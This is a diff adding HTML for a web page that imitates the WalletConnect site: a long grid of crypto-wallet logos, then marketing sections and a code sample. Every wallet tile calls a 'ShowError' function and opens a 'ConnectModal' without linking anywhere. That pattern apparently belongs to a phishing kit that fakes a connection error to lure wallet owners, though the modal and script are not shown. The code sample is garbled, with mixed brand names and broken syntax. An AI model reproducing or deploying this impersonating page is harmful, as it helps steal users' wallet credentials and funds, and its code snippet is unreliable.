+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/Valora.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Valora</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/ViaWallet.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Via Wallet</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/Vision.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Vision</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/Wallet.Io.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Wallet.IO</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/Wallet3.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Wallet 3</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/WallETH.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Wall ETH</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/XinFinXDCNetwork.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Xin Fin XDC Network</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/yiToken.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>yi Token</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/ZelCore.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Zel Core</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/LedgerLive.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>LedgerLive</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/KyberSwap.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>KyberSwap</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/Krystal.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Krystal</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/KeyRingPro.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>KeyRing Pro</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/JulWallet.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Ju Wallet</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/JadeWallet.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Jade Wallet</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/ioPay.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>io Pay</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/InfinityWallet.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Infinity Wallet</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/Infinito.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Infinito</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/HuobiWallet.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Huobi Wallet</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/HashKeyMe.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>HashKey Me</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/HaloDEFIWallet.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Halo Defi Wallet</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/GuardaWallet.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Guarda Wallet</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/GridPlus.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Grid Plus</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/GoPocket.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Go Pocket</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/GDWallet.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>GD Wallet</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/fxWallet.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>fxWallet</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/fuse.Cash.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>fuse.Cash</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/FlareWallet.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Flare Wallet</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/EncryptedInk.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Encrypted Ink</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/Ellipal.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Ellipal</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/ElastosEssential.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Elastos Essential</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/Eidoo.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Eidoo</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/EasyPocket.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Easy Pocket</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/DIDWallet.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>DID Wallet</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/Dharma.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Dharma</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/Defiant.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Defiant</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/DCentWallet.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>D Cent Wallet</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/CYBAVOWallet.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>CYBAVO Wallet</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/CoolWalletS.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Cool Wallet S</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/CoinUs.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Coin US</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/CoinOmi.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Coin Omi</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/Coinhub.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Coinhub</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/Coin98.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Coin98</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/cmorq.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>cmorq</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/ChaingeFinance.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Chainge Finance</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/CeloWallet.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Celo Wallet</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/BullApp.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Bull App</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/1inchWallet.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>1 Inch Wallet</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/AirGap.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Air Gap</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/Aktionariat.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Aktionariat</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/Alice.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Alice</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/AlphaWallet.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Alpha Wallet</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/AnyBit.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>AnyBit</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/ArchiPage.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Archi Page</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/AT.WAllet.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>AT.Wallet</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/ATokenWallet.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>A Token Wallet</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/Atomic.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Atomic</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/Authereum.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Authereum</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/Avacus.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Avacus</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/Binana.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Binana</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/BitKeep.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>BitKeep</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/Bitpie.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Bitpie</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/BlockBank.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Block bank</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+            <div class="col-6 col-sm-4 col-md-2 mb-3">
+                <div class="card">
+                    <a>
+                        <div class="card-body text-center">
+                            <img onclick="ShowError(this.src)" data-toggle="modal" data-target="#ConnectModal" src="Main/logo/md/BridgeWallet.jpg" class="img-fluid img-sm" style="cursor:pointer">
+                            <figure>Bridge Wallet</figure>
+                        </div>
+                    </a>
+
+                </div>
+            </div>
+
+
+
+
+        </div>
+
+
+    </div>
+
+</div>
+
+
+<div class="row p-5" style="padding: 7% 0; background-color:white;">
+    <div class="col-md-12">
+        <h2 style="font-weight:900;color:#2b6cb0; font-size:3rem; font-family:'Segoe UI'; line-height:65px;">The Blockchain SDK</h2>
+        <p style="font-family:'Segoe UI'; color:#4f5568;">Built for developers, the WalletConnect web, android, and iOS SDK’s power millions of web3 connections every day.</p>
+
+        <img src="Main/assets/blockchain-connect.png" alt="Social-card" class="img-fluid">
+    </div>
+    <br>
+    <br>
+    <br>
+    <br>
+    <div class="row" id="circle-check" style="padding: 2% 2% 2% 2%!important;">
+        <div class="col-md-3">
+            <p><i class="fa fa-check"></i></p>
+            <h3>Protocol</h3>
+            WalletConnect is not an app, but an open protocol to communicate securely between Wallets and Dapps (Web3 Apps).
+        </div>
+
+        <div class="col-md-3">
+            <p><i class="fa fa-check"></i></p>
+            <h3>Secure Encryption</h3>
+            The protocol establishes a remote connection between two apps and/or devices. These payloads are symmetrically encrypted through a shared key between the two peers.
+        </div>
+
+        <div class="col-md-3">
+            <p><i class="fa fa-check"></i></p>
+            <h3>QR Codes &amp; Deep Links</h3>
+            The connection is initiated by one peer displaying a QR Code or deep link with a standard WalletConnect URI and is established when the counter-party approves this connection request.
+        </div>
+
+
+        <div class="col-md-3">
+            <p><i class="fa fa-check"></i></p>
+            <h3>Push Server</h3>
+            Also included is an optional Push server to allow native applications to notify the user of incoming payloads for established connections.
+        </div>
+
+
+    </div>
+</div>
+
+
+<div class="row p-5" style="padding: 7% 0% !important;">
+    <div class="col-md-6" style="padding: 2% 2% 2% 5%!important;">
+        <div>
+            <div class="corner-card">
+                <code style="color:white;">
+                    <span style="color:#5ddbca">import</span> ConnectWalletClient <span style="color:#5ddbca">from</span>   <span style="color:#addb67"> @ConnectWallet/client;</span>
+                    <br>
+                    <br>
+                    <span style="color:#5ddbca">const</span> client = <span style="color:#5ddbca">await</span> ConnectWalletClient.<span>init</span><span style="color:#c785c4">({</span>
+                    <br>
+                    apiKey: <span style="color:#5ddbca">from</span>   <span style="color:#addb67">"c4f79cc821944d9680842e34466bfbd"</span>,
+                    <br>
+                    <span style="color:#c785c4;">
+                        });
+                    </span>
+
+                </code>
+            </div>
+
+        </div>
+    </div>
+
+    <div class="col-md-6">
+
+        <h2 style="font-weight:900;color:#2b6cb0; font-size:3rem; font-family:'Segoe UI'; line-height:65px;">Simple Integration</h2>
+
+        <p style="font-size: 1.2rem;">ConnectWallet can be integrated with just a few lines of code. SDK’s available for javascript, iOS/Swift, and Android/Kotlin.</p>
+
+        <a href="#" id="docLink"><span style="font-weight:bolder; color:#2b6cb0; font-size:1.3rem;">Read the docs</span> <i class="fa fa-arrow-right"></i></a>
+
+    </div>
+</div>
+<div class="row" style="background-color:white">
+    &nbsp; &nbsp; &nbsp; <br> <br>
+</div>
+
+<div class="row mt-5" style="padding: 2% 0% !important;">
+    <div class="col-md-6" style="padding: 2% 2% 2% 5%!important;">
+        <h2 style="font-weight:900;color:#2b6cb0; font-size:3rem; font-family:'Segoe UI'; line-height:65px;">Any Wallet.</h2>
+
+        <p style="font-size: 1.2rem;">WalletConnect is built into more than 75 leading wallets. Easily integrate WalletConnect into your <br> wallet with our Javascript, Swift, or Kotlin SDK’s.</p>
+
+        <a href="#" id="docLink"><span style="font-weight:bolder; color:#2b6cb0; font-size:1.3rem;">See all wallets</span> <i class="fa fa-arrow-right"></i></a>
+    </div>
+
+    <div class="col-md-6" style="padding: 2% 2% 2% 5%!important;">
+        <h2 style="font-weight:900;color:#2b6cb0; font-size:3rem; font-family:'Segoe UI'; line-height:65px;">Any Chain.</h2>
+
+        <p style="font-size: 1.2rem;">
+            WalletConnect is chain agnostic and built to work with any blockchain. Developers can create multi-chain experiences and applications.
+            <br>
+            More chains coming soon.
+        </p>
+
+    </div>
+</div>
+
+
+<div class="row mt-5" style="padding: 2% 0% !important; background-color:white">
+    <div class="col-md-3">
+
+    </div>
+    <div class="col-md-6 text-center" style="padding: 2% 2% 2% 5%!important;">
+        <h2 style="font-weight:900;color:#2b6cb0; font-size:3rem; font-family:'Segoe UI'; line-height:65px;">Top Features</h2>
+
+        <p style="font-size: 1.2rem;">Rebuilt from the ground up, v2 was created with features for the next generation of blockchain applications.</p>
+
+
+    </div>
+
+    <div class="col-md-3">
+
+    </div>
+
+</div>
+<div class="row" style="padding: 2% 0% !important; background-color:white">
+    <div class="col-md-4 text-center" style="padding: 2% 2% 2% 2%!important;">
+        <img src="Main/assets/feature-icons/chain-agnostic.svg">
+        <br>
+        <br>
+        <h5>Chain Agnostic</h5>
+        <p>Interoperate with any blockchain. Support new blockchains and rollups out-of-the-box.</p>
+
+    </div>
+
+    <div class="col-md-4 text-center" style="padding: 2% 2% 2% 2%!important;">
+
+        <img src="Main/assets/feature-icons/multi-chain.svg">
+        <br>
+        <br>
+        <h5>Multi Chain</h5>
+        <p>Connect to a wallet with one or more chains simultaneously and send transactions to different chains at the same time. No more chain switching.</p>
+
+    </div>
+
